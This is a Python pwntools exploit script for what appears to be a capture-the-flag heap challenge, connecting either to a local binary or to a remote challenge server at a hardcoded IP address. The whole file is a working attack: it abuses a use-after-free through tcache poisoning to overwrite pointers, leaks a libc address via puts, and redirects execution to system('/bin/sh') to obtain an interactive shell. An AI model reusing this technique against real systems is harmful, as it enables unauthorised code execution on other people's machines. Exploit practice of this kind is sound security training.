from pwn import *

if args.LOCAL:
    io=process('./chall')
    if args.GDB:
        cmd="""
        init-pwndbg
        """
        gdb.attach(io, cmd)
else:
    io=remote('34.70.212.151', 8001)
elf=ELF('./chall')     
libc=ELF('./libc-2.31.so')
def menu():
    io.recvuntil(b"5. Exit\n>> ")

def add(idx, size):
    menu()
    io.sendline(b"1")
    io.recvuntil(b"Index\n>> ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Size\n>> ")
    io.sendline(str(size).encode())

def change_size(idx, new_size):
    menu()
    io.sendline(b"2")
    io.recvuntil(b"Index\n>> ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Size\n>> ")
    io.sendline(str(new_size).encode())
    
def delete(idx):
    menu()
    io.sendline(b"3")
    io.recvuntil(b"Index\n>> ")
    io.sendline(str(idx).encode())

def edit(idx, data):
    menu()
    io.sendline(b"4")
    io.recvuntil(b"Index\n>> ")
    io.sendline(str(idx).encode())
    assert type(data) == type(b"")
    io.sendline(data)

def exit():
    menu()
    io.sendline(b"5")

pop_rbp_rbx=0x0000000000401586
pop_rsp=0x00000000004018bd
code=0x00000000004035D0
add(1, 80)
add(2, 80)
delete(1)
delete(2)
edit(2, p64(code))
add(1, 80)
add(2, 80)
edit(2, p64(0x403530))
exit=0x403578

add(1, 80)
add(2, 80)
delete(1)
delete(2)
edit(2, p64(exit))
add(1, 80)
add(2, 80)
edit(2, p64(elf.plt.puts))
io.sendline(b'5')
io.recvuntil(b'Bye\n')
leak=u64(io.recv(6)+b'\0\0') - 0x84420
print(hex(leak))

add(1, 80)
add(2, 80)
delete(1)
delete(2)
edit(2, p64(exit))
add(1, 80)
add(2, 80)
edit(2, p64(0x401180))
exit=0x403578

add(1, 80)
add(2, 80)
delete(1)
delete(2)
edit(2, p64(code+20))
add(1, 80)
add(2, 80)
edit(2, p64(u64('/bin/sh\0')))
exit=0x403578

add(1, 80)
add(2, 80)
delete(1)
delete(2)
edit(2, p64(exit))
add(1, 80)
add(2, 80)
edit(2, p64(libc.sym.system+leak))
exit=0x403578

add(1, 80)
add(2, 80)
delete(1)
delete(2)
edit(2, p64(code))
add(1, 80)
add(2, 80)
edit(2, p64(code+20))
exit=0x403578
io.sendline(b'5')
io.interactive()